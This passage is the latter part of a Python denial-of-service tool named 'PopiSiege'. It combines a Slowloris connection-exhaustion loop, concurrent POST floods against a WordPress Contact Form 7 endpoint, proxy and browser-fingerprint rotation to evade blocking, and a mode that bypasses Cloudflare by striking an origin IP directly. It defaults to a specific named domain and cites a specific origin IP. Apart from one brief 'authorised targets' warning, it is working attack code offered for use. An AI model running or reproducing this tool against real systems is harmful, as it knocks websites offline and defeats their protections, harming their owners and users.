    print()

    print(f"\n  {G}[PHASE 1 DONE]{W} Holding {len(sockets)} connections open\n")

    # ── Phase 2: drip loop ────────────────────────────────────────────────────
    print(f"  {Y}[PHASE 2]{W} Drip loop — header every {interval}s. Ctrl+C to stop.\n")

    round_num = 0
    try:
        while True:
            round_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            # Send one partial header line on every live socket
            dead_idx = []
            for i, s in enumerate(sockets):
                try:
                    s.send(f"X-a: {random.randint(1, 9999)}\r\n".encode())
                except socket.error:
                    dead_idx.append(i)

            # Replace dead sockets with fresh ones
            for i in reversed(dead_idx):
                sockets.pop(i)
                total_dead += 1
                ns = _sl_open_socket(host, port, domain)
                if ns:
                    sockets.append(ns)

            alive = _sl_server_alive(host, port, domain)
            status_str = (R + "DOWN  ⚠️  Workers likely exhausted" + W
                          if not alive else G + "ALIVE" + W)

            print(f"  {C}[Round {round_num:>4}]{W} {ts} | "
                  f"Sockets={len(sockets)}/{max_connections} | "
                  f"Dead(total)={total_dead} | "
                  f"Server={status_str} | "
                  f"Runtime={time.time()-start:.0f}s")

            time.sleep(interval)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C\n")
        print(f"  Closing {len(sockets)} hanging sockets...")
        for s in sockets:
            try: s.close()
            except: pass

    runtime = time.time() - start
    print(f"\n{B}{'='*66}{W}")
    print(f"  SLOWLORIS SUMMARY")
    print(f"{B}{'='*66}{W}")
    print(f"  Target      : {host}:{port}  ({domain})")
    print(f"  Runtime     : {runtime:.0f}s")
    print(f"  Rounds      : {round_num}")
    print(f"  Peak open   : {max_connections}")
    print(f"  Total dead  : {total_dead}")
    print(f"{B}{'='*66}{W}\n")


# ─────────────────────────────────────────────────────────────────────────────
#  BURST — fire N concurrent requests
# ─────────────────────────────────────────────────────────────────────────────

def burst(concurrency, cfg, pool, verbose):
    ok = []; err = []; times = []
    with ThreadPoolExecutor(max_workers=concurrency) as ex:
        futures = [ex.submit(send_one, i, cfg, pool) for i in range(1, concurrency+1)]
        for f in as_completed(futures):
            num, code, elapsed, cache, proxy, error, profile = f.result()
            short = proxy.replace("http://","").replace("https://","")[:22]
            if code == 200:
                ok.append(code); times.append(elapsed)
            else:
                err.append(code)
            if verbose:
                sym = G+"[✓]"+W if code==200 else R+"[✗]"+W
                detail = f"HTTP={code or 'ERR':<3} | Time={elapsed:.2f}s | Cache={cache} | Profile={profile}"
                if error: detail += f" | {error}"
                print(f"    {sym} Req {num:>3} | {short:<22} | {detail}")
    return ok, err, times


# ─────────────────────────────────────────────────────────────────────────────
#  MAIN
# ─────────────────────────────────────────────────────────────────────────────

def main():
    p = argparse.ArgumentParser(
        description="PopiSiege VPS — CF7 worker exhaustion research tool",
        formatter_class=argparse.RawTextHelpFormatter
    )
    p.add_argument("--target",      default="metoo-shatkin.com",
                   help=f"Target domain (default: metoo-shatkin.com)\nAvailable: {', '.join(TARGETS)}")
    p.add_argument("--concurrency", type=int, default=None,
                   help="Concurrent requests per burst (default: auto from known threshold)")
    p.add_argument("--proxy-file",  default=PROXY_FILE,
                   help=f"Path to proxy list file (default: {PROXY_FILE})")
    p.add_argument("--fixed-profile", default=None, metavar="NAME",
                   help="Control mode: use ONE browser profile for every request instead\n"
                        "of rotating (e.g. --fixed-profile chrome124). Run this back-to-back\n"
                        "with the default rotating mode, same concurrency, to isolate whether\n"
                        "profile rotation actually matters vs. the block window just resetting.")
    p.add_argument("--no-proxy",    action="store_true",
                   help="Skip the proxy pool entirely — send every request from this\n"
                        "machine's own IP (still uses TLS impersonation).")
    p.add_argument("--static-proxies", action="store_true",
                   help="Force file-based proxy pool (bypasses backbone/Tor auto-detect).\n"
                        "Use with --proxy-file to load specific IPs directly.")
    p.add_argument("--proxy-rotate-interval", type=float, default=0, metavar="SECONDS",
                   help="Hold one proxy fixed for SECONDS, then advance to the next,\n"
                        "instead of a new proxy every request (default: 0 = per-request).\n"
                        "Example: --proxy-rotate-interval 30")
    p.add_argument("--homepage",    action="store_true",
                   help="GET the domain's homepage instead of POSTing to the CF7\n"
                        "feedback endpoint. Same concurrency/proxy/profile rotation —\n"
                        "isolates whether a cached GET behaves differently under\n"
                        "flood than the always-uncached CF7 POST.")
    p.add_argument("--large-payload", action="store_true",
                   help="Inflate each request: multi-paragraph message (~3KB) +\n"
                        "4-8 extra form fields. Increases per-worker CPU time.")
    p.add_argument("--msg-repeat",   type=int, default=1, metavar="N",
                   help="Repeat the message body N times (separator between each).\n"
                        "N=5 → ~15KB, N=10 → ~30KB per request.\n"
                        "Combine with --large-payload for maximum size.\n"
                        "Example: --large-payload --msg-repeat 10")
    p.add_argument("--verbose",     action="store_true",
                   help="Show every request")
    p.add_argument("--delay",       type=float, default=0,
                   help="Seconds between bursts (default: 0)")
    p.add_argument("--origin",      default=None, metavar="IP",
                   help="PoC mode: bypass Cloudflare, hit origin IP directly\n"
                        "Example: --origin 104.236.68.226\n"
                        "Requests appear in Apache logs WITHOUT CF-Connecting-IP\n"
                        "Proves direct origin attack for legal/court evidence")
    p.add_argument("--slowloris",   action="store_true",
                   help="Slowloris mode: exhaust Apache connection pool with partial HTTP sockets\n"
                        "Use with --origin to bypass Cloudflare (CF absorbs Slowloris at edge)\n"
                        "Example: --slowloris --origin 104.236.68.226")
    p.add_argument("--connections", type=int, default=200,
                   help="Slowloris: max hanging connections (default: 200, Apache default limit=150)")
    p.add_argument("--interval",    type=float, default=10,
                   help="Slowloris: seconds between header drips (default: 10)")
    p.add_argument("--port",        type=int, default=80,
                   help="Slowloris: target port (default: 80; use 8080 if needed)")
    args = p.parse_args()

    if args.fixed_profile:
        global FIXED_PROFILE
        match = next((pr for pr in BROWSER_PROFILES if pr[0] == args.fixed_profile), None)
        if match is None:
            print(f"\n  {R}[ERROR]{W} Unknown profile: {args.fixed_profile}")
            print(f"  Available: {', '.join(p[0] for p in BROWSER_PROFILES)}\n")
            sys.exit(1)
        FIXED_PROFILE = match

    if args.homepage:
        global HOMEPAGE_MODE
        HOMEPAGE_MODE = True

    if args.large_payload:
        global LARGE_PAYLOAD
        LARGE_PAYLOAD = True

    if args.msg_repeat > 1:
        global MSG_REPEAT
        MSG_REPEAT = args.msg_repeat

    # ── slowloris: domain not required, can run standalone with --origin ─────
    if args.slowloris:
        if args.origin:
            sl_host   = args.origin
            sl_domain = args.target.replace("https://","").replace("http://","").strip("/")
        else:
            # no --origin: resolve domain to IP (goes through CF edge — less effective on origin)
            sl_domain = args.target.replace("https://","").replace("http://","").strip("/")
            try:
                sl_host = socket.gethostbyname(sl_domain)
            except socket.gaierror as e:
                print(f"\n  {R}[ERROR]{W} Cannot resolve {sl_domain}: {e}\n"
                      f"  Tip: use --origin <IP> to bypass Cloudflare and hit origin directly.\n")
                sys.exit(1)
            print(f"\n  {Y}[WARN]{W} No --origin given. Resolved {sl_domain} → {sl_host}")
            print(f"  {Y}[WARN]{W} Cloudflare will absorb this. Use --origin for origin testing.\n")
        run_slowloris(sl_host, args.port, sl_domain, args.connections, args.interval)
        return

    # ── resolve target ────────────────────────────────────────────────────────
    domain = args.target.replace("https://","").replace("http://","").strip("/")
    if domain not in TARGETS:
        print(f"\n  {R}[ERROR]{W} Unknown target: {domain}")
        print(f"  Known: {', '.join(TARGETS)}\n")
        print(f"  To add a new target, use: --target <domain>")
        sys.exit(1)

    cfg         = TARGETS[domain]
    concurrency = args.concurrency or cfg["threshold"]

    # ── load proxies (or skip entirely with --no-proxy) ────────────────────────
    if args.no_proxy:
        pool = None
    else:
        try:
            if args.static_proxies:
                pool = ProxyPool(args.proxy_file, rotate_interval=args.proxy_rotate_interval)
            else:
                pool = make_pool(args.proxy_file)
        except FileNotFoundError:
            print(f"\n  {R}[ERROR]{W} Proxy file not found: {args.proxy_file}")
            print(f"  Run: python3 proxy_tester.py\n")
            sys.exit(1)

    # ── origin PoC mode ───────────────────────────────────────────────────────
    if args.origin:
        print(f"""
{B}{'='*66}{W}
  PopiSiege — ORIGIN BYPASS MODE (PoC / Legal Evidence)
{B}{'='*66}{W}
  Origin IP   : {args.origin}
  Domain      : {domain}
  Endpoint    : http://{args.origin}/<cf7-path>
  Host Header : {domain}
  Concurrency : {concurrency} per burst
  Mode        : Direct origin hit — bypasses Cloudflare entirely
  Evidence    : CF-Connecting-IP=ABSENT in response = direct attack proof
{R}  WARNING     : Requests hit origin server directly — will appear in{W}
{R}              : Apache logs. Use only on authorised targets.{W}
{B}{'='*66}{W}
""")
        total_ok = 0; total_err = 0; burst_num = 0; start = time.time()
        try:
            while True:
                burst_num += 1
                ts = datetime.now().strftime("%H:%M:%S")
                with ThreadPoolExecutor(max_workers=concurrency) as ex:
                    futures = [ex.submit(send_one_direct, i, cfg, args.origin)
                               for i in range(1, concurrency+1)]
                    for f in as_completed(futures):
                        num, code, elapsed, cf_ip, via, err = f.result()
                        sym = G+"[✓]"+W if code in (200,403) else R+"[✗]"+W
                        hit_type = (R+"DIRECT HIT (no CF)"+W
                                    if cf_ip == "ABSENT"
                                    else G+"CF-proxied"+W)
                        status = f"HTTP={code or 'ERR':<3} | {elapsed:.2f}s | CF-IP={cf_ip} | {hit_type}"
                        if err: status += f" | {err}"
                        print(f"  {sym} [{ts}] Req {num:>2} | {status}")
                        if code in (200, 403): total_ok += 1
                        else: total_err += 1
                print(f"  {C}[Burst {burst_num}]{W} Done | "
                      f"OK={total_ok} ERR={total_err} | Runtime={time.time()-start:.0f}s\n")
                if args.delay > 0:
                    time.sleep(args.delay)
        except KeyboardInterrupt:
            print(f"\n  {Y}[STOPPED]{W} Ctrl+C\n"
                  f"  Total direct hits: {total_ok+total_err} | "
                  f"Runtime: {time.time()-start:.0f}s\n")
        return

    print(f"""
{B}{'='*66}{W}
  PopiSiege VPS — CF7 Worker Exhaustion
{B}{'='*66}{W}
  Target      : {cfg['url']}
  Form ID     : {cfg['form_id']}
  Unit Tag    : {cfg['unit_tag']}
  Concurrency : {concurrency} per burst  (threshold = {cfg['threshold']})
  Proxies     : {(str(pool.alive()) + " alive — rotating per request") if pool else "NONE — sending from this machine's own IP"}
  TLS         : {("FIXED — " + FIXED_PROFILE[0] + " for every request (control mode)") if FIXED_PROFILE else f"rotating {len(BROWSER_PROFILES)} real browser profiles (TLS+UA matched per request)"}
  Mode        : Continuous until Ctrl+C
{B}{'='*66}{W}
""")

    # ── stats ─────────────────────────────────────────────────────────────────
    total_ok  = 0
    total_err = 0
    burst_num = 0
    all_times = []
    start     = time.time()

    try:
        while True:
            burst_num += 1
            ts = datetime.now().strftime("%H:%M:%S")

            if not args.verbose:
                proxy_status = f"Proxies alive={pool.alive()}" if pool else "Direct (own IP)"
                print(f"  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"{proxy_status} | Sending {concurrency}...",
                      end="", flush=True)

            ok, err, times = burst(concurrency, cfg, pool, args.verbose)

            total_ok  += len(ok)
            total_err += len(err)
            all_times += times

            avail  = len(ok) / concurrency * 100
            avg_t  = sum(times)/len(times) if times else 0
            run_t  = time.time() - start

            if avail >= 80:   status = G+"STABLE"+W
            elif avail >= 30: status = Y+"DEGRADED"+W
            else:             status = R+"DOWN"+W

            if not args.verbose:
                print(f"\r  {C}[Burst {burst_num:>4}]{W} {ts} | "
                      f"OK={len(ok)}/{concurrency} | "
                      f"Avail={avail:>5.1f}% | "
                      f"Avg={avg_t:.2f}s | "
                      f"Status={status} | "
                      f"Runtime={run_t:.0f}s")
            else:
                print(f"\n  {C}[Burst {burst_num}]{W} OK={len(ok)}/{concurrency} | "
                      f"Avail={avail:.1f}% | Avg={avg_t:.2f}s | {status}\n")

            if pool is not None and pool.alive() == 0:
                pool.refresh(args.proxy_file)

            if args.delay > 0:
                time.sleep(args.delay)

    except KeyboardInterrupt:
        print(f"\n\n  {Y}[STOPPED]{W} Ctrl+C received.\n")

    # ── final report ──────────────────────────────────────────────────────────
    runtime = time.time() - start
    total   = total_ok + total_err

    print(f"{B}{'='*66}{W}")
    print(f"  FINAL REPORT")
    print(f"{B}{'='*66}{W}")
    print(f"  Target        : {cfg['url']}")
    print(f"  Runtime       : {runtime:.0f}s")
    print(f"  Bursts fired  : {burst_num}")
    print(f"  Total requests: {total}")
    print(f"  200 OK        : {total_ok}  ({total_ok/total*100:.1f}%)" if total else "  No data")
    print(f"  Errors        : {total_err}  ({total_err/total*100:.1f}%)" if total else "")
    if all_times:
        print(f"  Avg resp time : {sum(all_times)/len(all_times):.2f}s")
        print(f"  Max resp time : {max(all_times):.2f}s")
    if pool is not None and hasattr(pool, '_dead'):
        print(f"  Proxies dead  : {len(pool._dead)}/{len(pool.proxies)}")
    print(f"  RPS           : {total/runtime:.2f}" if runtime > 0 else "")
    print(f"{B}{'='*66}{W}\n")


if __name__ == "__main__":
    main()
